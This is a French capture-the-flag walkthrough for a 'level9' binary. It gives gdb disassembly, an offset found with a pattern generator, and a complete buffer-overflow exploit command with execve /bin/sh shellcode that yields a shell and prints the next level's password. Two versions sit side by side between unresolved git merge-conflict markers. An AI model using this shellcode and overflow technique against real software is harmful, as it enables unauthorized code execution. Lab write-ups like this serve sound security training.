<<<<<<< HEAD
Le binaire level9 ne retourne rien en particulier

Lancer gdb 

			(gdb) disas main
			Dump of assembler code for function main:
			   0x080485f4 <+0>:	push   %ebp
			   0x080485f5 <+1>:	mov    %esp,%ebp
			   0x080485f7 <+3>:	push   %ebx
			   0x080485f8 <+4>:	and    $0xfffffff0,%esp
			   0x080485fb <+7>:	sub    $0x20,%esp
			   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
			   0x08048602 <+14>:	jg     0x8048610 <main+28>
			   0x08048604 <+16>:	movl   $0x1,(%esp)
			   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
			   0x08048610 <+28>:	movl   $0x6c,(%esp)
			   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
			   0x0804861c <+40>:	mov    %eax,%ebx
			   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
			   0x08048626 <+50>:	mov    %ebx,(%esp)
			   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
			   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
			   0x08048632 <+62>:	movl   $0x6c,(%esp)
			   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
			   0x0804863e <+74>:	mov    %eax,%ebx
			   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
			   0x08048648 <+84>:	mov    %ebx,(%esp)
			   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
			   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
			   0x08048654 <+96>:	mov    0x1c(%esp),%eax
			   0x08048658 <+100>:	mov    %eax,0x14(%esp)
			   0x0804865c <+104>:	mov    0x18(%esp),%eax
			   0x08048660 <+108>:	mov    %eax,0x10(%esp)
			   0x08048664 <+112>:	mov    0xc(%ebp),%eax
			   0x08048667 <+115>:	add    $0x4,%eax
			   0x0804866a <+118>:	mov    (%eax),%eax
			   0x0804866c <+120>:	mov    %eax,0x4(%esp)
			   0x08048670 <+124>:	mov    0x14(%esp),%eax
			   0x08048674 <+128>:	mov    %eax,(%esp)
			   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
			   0x0804867c <+136>:	mov    0x10(%esp),%eax
			   0x08048680 <+140>:	mov    (%eax),%eax
			   0x08048682 <+142>:	mov    (%eax),%edx
			   0x08048684 <+144>:	mov    0x14(%esp),%eax
			   0x08048688 <+148>:	mov    %eax,0x4(%esp)
			   0x0804868c <+152>:	mov    0x10(%esp),%eax
			   0x08048690 <+156>:	mov    %eax,(%esp)
			   0x08048693 <+159>:	call   *%edx
			   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
			   0x08048698 <+164>:	leave  
			   0x08048699 <+165>:	ret    
			End of assembler dump.


disas de _ZN1N13setAnnotationEPc

			(gdb) disas _ZN1N13setAnnotationEPc
			Dump of assembler code for function _ZN1N13setAnnotationEPc:
			   0x0804870e <+0>:	push   %ebp
			   0x0804870f <+1>:	mov    %esp,%ebp
			   0x08048711 <+3>:	sub    $0x18,%esp
			   0x08048714 <+6>:	mov    0xc(%ebp),%eax
			   0x08048717 <+9>:	mov    %eax,(%esp)
			   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
			   0x0804871f <+17>:	mov    0x8(%ebp),%edx
			   0x08048722 <+20>:	add    $0x4,%edx
			   0x08048725 <+23>:	mov    %eax,0x8(%esp)
			   0x08048729 <+27>:	mov    0xc(%ebp),%eax
			   0x0804872c <+30>:	mov    %eax,0x4(%esp)
			   0x08048730 <+34>:	mov    %edx,(%esp)
			   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
			   0x08048738 <+42>:	leave  
			   0x08048739 <+43>:	ret    
			End of assembler dump.

On peut y voir un memcpy, on récupère son adresse de retour 0x0804a00c 
donc l'adresse du code shell sera 0x0804a00c + 4 = 0x0804a010  (4 bytes = une adresse ) 

on créé notre chaine :
addr (0x0804a010) (4) + code shell (28) + buffer (76 caracteres) + addr (0x0804a00c) (4)


			./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'`

en accède à un shell 

			$ whoami
			bonus0
			$ cd ..
			$ ls
			ls: cannot open directory .: Permission denied
			$ cd bonus0	
			$ ls
			bonus0
			$ ls -la
			total 17
			dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
			dr-x--x--x  1 root   root    340 Sep 23  2015 ..
			-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
			-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
			-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
			-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
			-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
			$ cat .pass
			f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
			$ 
=======
Grâce à gdb on voit que le binaire fait un memcpy sur un buffer de 100, on peut donc réaliser un buffoverflow.
Il n'y a pas de call à /bin/sh donc on peut se dire qu'on va faire un shellcode injection

Pour trouver l'adresse on s'aide d'un buffer overflow pattern generator,


$ gdb level9

(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()

(gdb) info register eax
eax            0x41366441       1094083649

On utilise 0x41366441 dans notre pattern generator, on a un offset au 108 byte.

On a maintenant notre offset, on peut commencer à créer notre exploit.


On explore la stack pour créer notre exploit et trouver l'adresse de début de notre buffer.

(gdb) b *main+136
Breakpoint 1 at 0x804867c

(gdb) r "AAAA"
Starting program: /home/user/level9/level9 "AAAA"

Breakpoint 1, 0x0804867c in main ()

(gdb) x $eax
0x804a00c:      0x41414141

On a donc bien l'adresse de début de notre buffer 0x804a00c, pour finir, notre exploit sera de la forme:
    shellcode_addr + shellcode + filler + buffer_addr

Le shellcode_addr pointera sur notre shellcode, le filler servira à remplir le buffer afin de provoquer l'overflow et le buffer_addr renverra à notre buffer.

shellcode_addr = buffer_addr+4byte = 0x804a010
shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
filler = 108 - len(shellcode_addr) - len(shellcode) = 76
buffer_addr = 0x0804a00c

./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"'`
>>>>>>> 8669a7e5fb63edf774e5a6592acdd662f0a136bf
